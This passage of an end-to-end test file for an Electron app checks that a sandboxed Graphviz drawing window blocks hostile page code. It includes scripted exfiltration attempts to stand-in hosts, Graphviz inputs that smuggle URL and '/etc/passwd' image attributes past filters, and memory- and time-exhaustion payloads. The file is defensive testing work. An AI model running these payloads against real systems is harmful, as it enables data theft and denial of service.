      expect({ udp: datagrams.length, tcp: connections.length, dns: lookups.length }).toEqual({ udp: 0, tcp: 0, dns: 0 });
      expect({ datagrams, connections, lookups }).toEqual({ datagrams: [], connections: [], lookups: [] });
      // The one thing the session cannot stop: Chromium resolves the name of a dns-prefetch hint itself, as a speculative
      // lookup, through the machine's own resolver, whatever the proxy is. Only code that makes a <link> element in the
      // window's page can ask for it, and the page never does, and the pack's code runs in a worker, which has no DOM. The
      // test says so, and tells whoever reads its report, so the claim of the pull request is what is true.
      const hinted = resolved(log, hintHost);
      test.info().annotations.push({
        type: "known gap",
        description: `a dns-prefetch hint made by code in the page is resolved speculatively by the machine's resolver (${hinted.length} resolver events for ${hintHost}); page code is the app's own, and the pack runs in a worker with no DOM`,
      });
    } finally {
      await finish(app, userData);
      await close();
    }
  });

  test("the session's own filter holds with the policy turned off: nothing leaves, on any scheme", async () => {
    // Every way out in the test above is also stopped by the page's policy, and one by a header, so a filter that saw
    // nothing would have passed. Here the files are served with no policy at all (a switch that only the end-to-end seam
    // reaches), and the page tries again, from its own code and from code that arrived by data: and blob: URLs.
    const arrived: string[] = [];
    const server = createServer((request, response) => {
      arrived.push(`${request.method} ${request.url}`);
      response.end("leaked");
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const leak = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const { datagrams, connections, udpPort, tcpPort, close } = await listeners();
    const host = `leak-${Math.random().toString(36).slice(2)}.example.invalid`;
    const hintHost = `hint-${Math.random().toString(36).slice(2)}.example.invalid`;
    const { app, page, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      await app.evaluate(() => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.setPolicyOff(true));
      // A new window loads its files again, now without the policy.
      await app.evaluate(({ BrowserWindow }) => {
        BrowserWindow.getAllWindows()
          .find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))
          ?.webContents.forcefullyCrashRenderer();
      });
      await expect.poll(() => windows(app)).toEqual([]);
      expectPicture(await draw(app, automaton), "the window draws with no policy");
      // The network stack's log, from here on, for the names the page and its workers try.
      const log = join(userData, "net-log-off.json");
      const workerHost = `worker-${Math.random().toString(36).slice(2)}.example.invalid`;
      await app.evaluate(async ({ BrowserWindow }, path) => {
        const target = BrowserWindow.getAllWindows().find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))!;
        await target.webContents.session.netLog.startLogging(path, { captureMode: "everything" });
      }, log);
      // The policy really is off: an inline script and a string given to a timer run, which the policy forbids.
      const ways = await inWindow<Record<string, string>>(app, waysOut(leak));
      expect(ways).toMatchObject({ inlineScript: "ran", timerString: "ran" });
      // What the policy used to stop, the session's filter stops: the network, files, the other host and the files of the
      // window that are not on its list. (A worker of a file that is on the list is the window's own, and starts.)
      expect(ways).toMatchObject({
        fetch: "blocked", fetchNoCors: "blocked", fetchFile: "blocked", fetchOtherHost: "blocked", xhr: "blocked", image: "blocked",
        script: "blocked", stylesheet: "blocked", fontRemote: "blocked", fontFile: "blocked", fontOtherHost: "blocked", fontAppFile: "blocked",
        otherHostScript: "blocked", packWheel: "blocked", pythonFile: "blocked", importRemote: "blocked", websocket: "blocked",
        eventSource: "blocked", workerPack: "blocked", workerRemote: "blocked", open: "null", control: "reached",
      });
      // Code that arrived by a data: URL, a blob: URL and an iframe of data: runs, and its own attempts are refused too.
      // A worker's own requests, to a name nothing resolves, are refused before any lookup: only a page can make a hint.
      const reach = `fetch("http://${workerHost}/" + KIND).catch(() => 0); fetch(${JSON.stringify(leak + "/from-")} + KIND).catch(() => 0); try { new WebSocket(${JSON.stringify(leak.replace("http", "ws") + "/ws-from-")} + KIND); } catch (e) {} new Image().src = ${JSON.stringify(leak + "/img-from-")} + KIND;`;
      const nested = await inWindow<Record<string, string>>(
        app,
        `(async () => {
          const out = {};
          const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
          const code = (kind) => ${JSON.stringify(reach)}.replaceAll("KIND", JSON.stringify(kind)) + " globalThis.__ran = (globalThis.__ran || []).concat(" + JSON.stringify("x") + ");";
          // A module from a data: URL, which the policy would have refused and the filter does not see.
          try { await import("data:text/javascript," + encodeURIComponent(code("data-module"))); out.dataModule = "ran"; } catch (e) { out.dataModule = "refused"; }
          // A module from a blob: URL.
          try { await import(URL.createObjectURL(new Blob([code("blob-module")], { type: "text/javascript" }))); out.blobModule = "ran"; } catch (e) { out.blobModule = "refused"; }
          // A worker from a blob: URL.
          try { const w = new Worker(URL.createObjectURL(new Blob([code("blob-worker")], { type: "text/javascript" }))); w.onerror = () => {}; out.blobWorker = "started"; } catch (e) { out.blobWorker = "refused"; }
          // A document from data: in a frame, with a script in it.
          try { const frame = document.createElement("iframe"); frame.src = "data:text/html," + encodeURIComponent("<script>" + code("data-frame") + "<\/script>"); document.body.append(frame); out.dataFrame = "added"; } catch (e) { out.dataFrame = "refused"; }
          // Plain requests for data: and blob: URLs, which are not the network.
          out.fetchData = await fetch("data:text/plain,hello").then((r) => r.text(), () => "refused");
          out.fetchBlob = await fetch(URL.createObjectURL(new Blob(["blob"]))).then((r) => r.text(), () => "refused");
          out.fetchOwn = await fetch("pyxis-runtime://draw/index.html").then((r) => String(r.status), () => "refused");
          out.fetchOwnUnlisted = await fetch("pyxis-runtime://draw/nothing.js").then((r) => String(r.status), () => "refused");
          await wait(800);
          return out;
        })()`,
      );
      // The network stack's own work, with no policy either.
      await inWindow(app, networkStackScript(host, hintHost, udpPort, tcpPort));
      await app.evaluate(async ({ BrowserWindow }) => {
        const target = BrowserWindow.getAllWindows().find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))!;
        await target.webContents.session.netLog.stopLogging();
      });
      await page.waitForTimeout(1000);
      expect(nested.fetchData).toBe("hello");
      expect(nested.fetchBlob).toBe("blob");
      expect(nested.fetchOwn).toBe("200");
      expect(nested.fetchOwnUnlisted).not.toBe("200");
      // The server heard nothing from any of it, nor did a UDP listener or a TCP server, nor a resolver.
      expect(arrived).toEqual([]);
      expect({ udp: datagrams.length, tcp: connections.length, dns: resolved(log, host).length, workerDns: resolved(log, workerHost).length }).toEqual({ udp: 0, tcp: 0, dns: 0, workerDns: 0 });
      // The filter really was asked: it saw the requests the page made (and refused them), on the schemes it is given.
      const seen = await app.evaluate(() => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.seen());
      const schemes = [...new Set(seen.map((url) => url.split(":")[0]))].sort();
      expect(seen.some((url) => url.startsWith(`${leak}/fetch`))).toBe(true);
      expect(seen.some((url) => url.startsWith("ws://127.0.0.1"))).toBe(true);
      expect(seen.some((url) => url === "pyxis-runtime://draw/draw-host.js")).toBe(true);
      expect(schemes).toEqual(SEEN_SCHEMES);
      // The server does record what reaches it.
      await app.evaluate((_, url) => fetch(url).then((reply) => reply.text()), `${leak}/control`);
      expect(arrived).toEqual(["GET /control"]);
    } finally {
      await app.evaluate(() => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.setPolicyOff(false)).catch(() => undefined);
      await finish(app, userData);
      await close();
      await new Promise((resolve) => server.close(resolve));
    }
  });

  test("stops a page that fills memory, in a real window, and draws again with a new one", async () => {
    const { app, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "before");
      const [open] = await windows(app);
      // The page allocates 64 MB at a time and touches it, as the pack's own code could. The window's working set is read every
      // 250 ms during a drawing, and over 512 MB the window is destroyed; Chromium may also end it first.
      const script = `(async () => {
        const held = [];
        for (let i = 0; i < 60; i++) {
          held.push(new Uint8Array(64 * 1024 * 1024).fill(i + 1));
          await new Promise((resolve) => setTimeout(resolve, 15));
        }
        return { ok: true, png: "never" };
      })()`;
      const started = Date.now();
      const result = await app.evaluate((_, [text, ms]) => (globalThis as unknown as { pyxisE2eDraw: Handle }).pyxisE2eDraw.runScript(text, ms), [script, 20000] as const);
      expect(Date.now() - started, "stopped well before the script's own end").toBeLessThan(15000);
      expect(result).toMatchObject({ error: expect.stringMatching(/too much memory|^runtime-draw-crashed$/) });
      expect(await windows(app)).toEqual([]);
      expectPicture(await draw(app, automaton), "after");
      const [replaced] = await windows(app);
      expect(replaced).not.toBe(open);
    } finally {
      await finish(app, userData);
    }
  });

  test("checks what Graphviz understood, so the texts that got past the text checks reach no layout", async () => {
    // Sent to the window with the checks of the text skipped, as the review's two bypasses and their family are. The window
    // parses each with Graphviz first, and refuses by what Graphviz made of it.
    const { app, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      const names = (prefix: string, n: number) => Array.from({ length: n }, (_, i) => `${prefix}${i}`).join(" ");
      const refused: Array<[string, string, RegExp]> = [
        ["URL split by a continuation", 'digraph { a ["UR\\\nL"="https://example.com/x"] }', /^the attribute URL is not allowed/],
        ["image split by a continuation", 'digraph { a ["ima\\\nge"="/etc/passwd"] }', /^the attribute image is not allowed/],
        ["URL joined by +", 'digraph { a ["UR" + "L"="https://example.com/c"] }', /^the attribute URL is not allowed/],
        ["layout name split", 'digraph { "lay\\\nout"=sfdp; a -> b }', /^layout=sfdp is not allowed/],
        ["layout value split", 'digraph { layout="sf\\\ndp"; a -> b }', /^layout=sfdp is not allowed/],
        ["fontname joined", 'digraph { a [fontname="Tim" + "es"] }', /^fontname=Times is not allowed/],
        ["a tuning knob joined", 'digraph { "mc" + "limit"=1000000; a -> b }', /only tunes how long the layout takes/],
        ["a subgraph named again", `digraph { subgraph s { ${names("n", 20)} } subgraph s {} -> subgraph s {} }`, /^the graph has 400 edges: keep it within 300$/],
        ["the most that 4,000 characters make", `digraph { subgraph s { ${names("n", 150)} } ${Array.from({ length: 10 }, () => "subgraph s {}").join(" -> ")} }`, /^the graph has 202500 edges: keep it within 300$/],
        ["every pair of two groups", `digraph { {${names("a", 20)}} -> {${names("b", 20)}} }`, /^the graph has 400 edges/],
        ["an HTML-like label", 'digraph { a [label=<<TABLE HREF="http://x"><TR><TD><IMG SRC="/etc/passwd"/></TD></TR></TABLE>>] }', /HTML-like labels/],
        // A `key` on an edge statement makes an edge of a pair that is already there: Graphviz builds 392 edges from this text.
        ["a key on an edge statement of a strict graph", `strict graph { {${names("a", 14)}} -- {${names("b", 14)}}; {${names("b", 14)}} -- {${names("a", 14)}} [key=k] }`, /^the graph has 392 edges/],
      ];
      for (const [name, code, message] of refused) {
        const started = Date.now();
        const result = await drawUnchecked(app, code);
        expect(result, name).toHaveProperty("error");
        expect((result as { error: string }).error, name).toMatch(message);
        // Refused before the layout, so quickly, and without costing the window.
        expect(Date.now() - started, name).toBeLessThan(5000);
        expect((result as { timedOut?: boolean }).timedOut, name).toBeUndefined();
      }
      expect(await windows(app)).toHaveLength(1);
      // Where the key is not an edge's it makes no edge: the same 196 pairs are drawn, with the text checks as well.
      const pairs = `{${names("a", 14)}} -- {${names("b", 14)}}; {${names("b", 14)}} -- {${names("a", 14)}}`;
      for (const code of [`strict graph { edge [KEY=k]; ${pairs} }`, `strict graph { edge [key=k]; ${pairs} }`, `strict graph { ${pairs} [KEY=k] }`])
        expectPicture(await draw(app, code), code.slice(0, 40));
      expectPicture(await draw(app, automaton), "after them all");
    } finally {
      await finish(app, userData);
    }
  });

  test("holds the layouts that run longest to the time limit, with the attributes that the checks allow and that make them long", async () => {
    // Measured on the pack's Graphviz, at the limits of 150 nodes and 300 edges: a very large `peripheries` runs for more
    // than 20 seconds, a very large `sides` for 7 and writes 155 MB of SVG, and `splines=curved` on `neato` runs for more
    // than 20 as well. These pass the checks, so they run inside the layout, where the time limit of the kind has to stop
    // them. Each is given less time than it takes, so the stop is certain.
    const { app, userData } = await start();
    try {
      expectPicture(await draw(app, automaton), "the window is open");
      const heavy: Array<[string, string, number]> = [
        ["peripheries=100000", scatter("peripheries=100000"), 1500],
        ["sides=100000", scatter("shape=polygon sides=100000"), 1500],
        ["splines=curved on neato", scatter("", "layout=neato; splines=curved"), 1500],
      ];
      for (const [name, code, timeoutMs] of heavy) {
        expect(figureProblem("graph", code), `${name} passes the checks`).toBeNull();
        const started = Date.now();
        const result = await draw(app, code, { timeoutMs });
        const took = Date.now() - started;
        expect(result, name).toMatchObject({ timedOut: true });
        // Stopped at the limit, not when the layout would have ended on its own.
        expect(took, name).toBeLessThan(timeoutMs + 3000);
        // The window that ran it is gone, and the next drawing gets a new one and a picture.
        expect(await windows(app), name).toEqual([]);
        expectPicture(await draw(app, automaton), `after ${name}`);
      }
    } finally {
      await finish(app, userData);
    }
  });

  test("stops a drawing that runs over its time, replaces a crashed window, queues requests, and refuses a damaged pack file", async () => {
    const { app, page, userData } = await start();
    try {
      // A graph at the limits (150 nodes, 300 edges) passes the checks, and ends in a picture or at the time limit.
      const dense = ring(150, "neato");
      expect(figureProblem("graph", dense)).toBeNull();
      const started = Date.now();
      const heavy = await draw(app, dense);
      expect(Date.now() - started).toBeLessThan(30000);
      expectPictureOrFailure(heavy, "a graph at the limits");
      if ("error" in heavy) expect(heavy.timedOut, "it stopped at the time limit").toBe(true);

      // A drawing that runs over its time destroys the window, and the next request gets a new one.
      expectPicture(await draw(app, automaton), "before the time limit");
      const [open] = await windows(app);
      expect(open).toBeDefined();
      const slow = await draw(app, ring(150, "neato"), { timeoutMs: 50 });
      expect(slow).toMatchObject({ timedOut: true });
      expect((slow as { error: string }).error).toMatch(/longer than 0\.05 seconds/);
      expect(await windows(app)).toEqual([]);
      expectPicture(await draw(app, automaton), "after the time limit");
      const [replaced] = await windows(app);
      expect(replaced).toBeDefined();
      expect(replaced).not.toBe(open);

      // A crashed window is replaced on the next request.
      await app.evaluate(({ BrowserWindow }) => {
        BrowserWindow.getAllWindows()
          .find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))
          ?.webContents.forcefullyCrashRenderer();
      });
      await expect.poll(() => windows(app)).toEqual([]);
      expectPicture(await draw(app, automaton), "after a crash");
      const [afterCrash] = await windows(app);
      expect(afterCrash).not.toBe(replaced);

      // Requests queue: several at once all come back, one window drew them, and none was lost to another.
      const sizes = await Promise.all(
        [automaton, "graph { a -- b }", "digraph { x -> y -> z }", ring(20), "digraph { p -> q }"].map((code) => draw(app, code)),
      );
      sizes.forEach((result, index) => expectPictureOrFailure(result, `queued ${index}`));
      expect(sizes.filter((result) => "image" in result).length).toBeGreaterThanOrEqual(4);
      expect(await windows(app)).toHaveLength(1);

      // A file of the pack that no longer matches its hash is not served, so the window cannot load it: no picture, no
      // fault of the figure, and the window is replaced so that a repaired pack is read again.
      await page.evaluate(() => window.pyxis.invoke("tools.runtime", {}));
      const library = join(stagedDrawingPack(userData), "graphviz.js");
      const original = readFileSync(library);
      const changed = Buffer.from(original);
      changed[1000] = changed[1000]! ^ 0xff;
      // A new window is needed to read the library again, so the one that holds it is stopped first.
      await app.evaluate(({ BrowserWindow }) => {
        BrowserWindow.getAllWindows()
          .find((candidate) => candidate.webContents.getURL().startsWith("pyxis-runtime://draw/"))
          ?.webContents.forcefullyCrashRenderer();
      });
      await expect.poll(() => windows(app)).toEqual([]);
      writeFileSync(library, changed);
      const damaged = await draw(app, automaton);
      expect(damaged).toEqual({ error: "runtime-draw-library-missing" });
      expect(await windows(app)).toEqual([]);
      writeFileSync(library, original);
      expectPicture(await draw(app, automaton), "after the pack file was repaired");
    } finally {
      await finish(app, userData);
    }
  });
});

test.describe("without the drawing pack", () => {
  test("a request fails as the runtime's, with no window", async () => {
    const userData = mkdtempSync(join(tmpdir(), "pyxis-drawing-none-"));
    const app = await launchPyxis({ userData, env: { HOME: userData } });
    try {
      const page: Page = await app.firstWindow();
      await page.getByRole("button", { name: "Salta" }).click();
      await fromChiediToExams(page);
      expect(await draw(app, automaton)).toEqual({ error: "runtime-missing" });
      expect(await windows(app)).toEqual([]);
    } finally {
      await finish(app, userData);
    }
  });
});
